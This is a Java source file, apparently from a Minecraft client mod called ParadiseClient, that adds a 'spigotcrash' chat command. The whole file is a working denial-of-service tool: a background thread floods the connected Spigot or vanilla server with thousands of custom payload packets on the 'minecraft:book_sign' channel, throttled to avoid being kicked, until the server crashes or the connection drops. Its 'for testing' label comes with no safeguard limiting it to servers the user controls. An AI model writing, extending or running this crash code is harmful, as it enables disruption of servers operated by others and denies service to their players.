package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.command.CommandSource;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.CustomPayload.Id;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.nio.charset.StandardCharsets;
import java.util.Random;

import io.netty.buffer.Unpooled;

public class SpigotCrashCommand extends Command {

    private boolean isActive = false;
    private int packetCount = 3000;

    public SpigotCrashCommand() {
        super("spigotcrash", "Attempts to crash Spigot/Vanilla servers (for testing)");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(this::executeDefault)
                .then(argument("count", IntegerArgumentType.integer(1, 100000))
                        .executes(this::executeWithCount));
    }

    private int executeDefault(CommandContext<CommandSource> context) {
        toggleCrash();
        return 1;
    }

    private int executeWithCount(CommandContext<CommandSource> context) {
        this.packetCount = IntegerArgumentType.getInteger(context, "count");
        toggleCrash();
        return 1;
    }

    private void toggleCrash() {
        isActive = !isActive;
        if (isActive) {
            Helper.printChatMessage("§aCrash enabled! Sending " + packetCount + " packets.");
            startCrashing();
        } else {
            Helper.printChatMessage("§cCrash disabled.");
        }
    }

    private void startCrashing() {
        new Thread(() -> {
            try {
                MinecraftClient client = MinecraftClient.getInstance();
                ClientPlayerEntity player = client.player;
                ClientPlayNetworkHandler connection = client.getNetworkHandler();

                if (player == null || connection == null) {
                    Helper.printChatMessage("§cNot connected to a server.");
                    isActive = false;
                    return;
                }

                Random random = new Random();

                while (isActive && connection.getConnection().isOpen()) {
                    for (int i = 0; i < packetCount; i++) {
                        String randomData = "crash" + random.nextInt();
                        byte[] payload = randomData.getBytes(StandardCharsets.UTF_8);

                        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
                        buf.writeBytes(payload);

                        CustomPayload payloadObj = new CustomPayload() {
                            private final Id<CustomPayload> ID = new Id<>(Identifier.of("minecraft:book_sign"));

                            @Override
                            public Id<? extends CustomPayload> getId() {
                                return ID;
                            }

                        
                            public void write(PacketByteBuf out) {
                                out.writeBytes(buf);
                            }
                        };

                        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(payloadObj);
                        connection.sendPacket(packet);
                    }

                    Thread.sleep(50); // Throttle to avoid disconnect
                }
            } catch (Exception e) {
                Helper.printChatMessage("§cCrash error: " + e.getMessage());
                e.printStackTrace();
            } finally {
                if (isActive) {
                    isActive = false;
                    Helper.printChatMessage("§cCrash stopped (possibly disconnected).");
                }
            }
        }, "CrashThread").start();
    }
}
